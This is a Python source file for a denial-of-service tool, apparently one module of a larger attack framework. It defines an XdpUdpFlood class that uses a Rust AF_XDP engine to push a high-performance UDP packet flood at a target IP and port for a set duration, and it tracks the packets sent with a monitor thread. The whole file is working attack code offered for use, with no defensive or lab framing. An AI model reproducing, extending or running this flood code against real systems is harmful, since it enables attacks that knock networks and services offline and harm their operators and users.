import time
import threading
from .base import AttackBase
from core.xdp_engine import XdpFloodWrapper, XDP_AVAILABLE

class XdpUdpFlood(AttackBase):
    """High-performance UDP flood using AF_XDP (Rust)."""

    def __init__(self, *args, interface="eth0", **kwargs):
        super().__init__(*args, **kwargs)
        if not XDP_AVAILABLE:
            raise RuntimeError("XDP engine not available. Rust library missing.")

        # Parse target IP into list of ints
        dst_ip = [int(x) for x in self.target.split(".")]

        self.engine = XdpFloodWrapper(
            interface=interface,
            dst_ip=dst_ip,
            dst_port=self.port,
            src_port=12345,  # arbitrary source port
        )
        self._monitor_thread = None
        self._monitor_running = False

    def start(self):
        self.stats["start_time"] = time.time()
        self.engine.start()
        self._start_monitor()                # <-- added
        time.sleep(self.duration)
        self._stop_monitor()                 # <-- added
        self.engine.stop()
        self.stats["end_time"] = time.time()
        self.stats["requests"] = self.engine.get_packets_sent()
        return self.stats

    def _start_monitor(self):
        self._monitor_running = True
        self._monitor_thread = threading.Thread(target=self._monitor_loop)
        self._monitor_thread.daemon = True
        self._monitor_thread.start()

    def _stop_monitor(self):
        self._monitor_running = False
        if self._monitor_thread:
            self._monitor_thread.join(timeout=1)

    def _monitor_loop(self):
        last_count = 0
        while self._monitor_running:
            time.sleep(1.0)
            count = self.engine.get_packets_sent()
            pps = count - last_count
            with self.lock:
                self.stats["requests"] = count
                self.stats["bytes_sent"] = count * 64  # approx packet size
            last_count = count

    def worker(self) -> int:
        return 0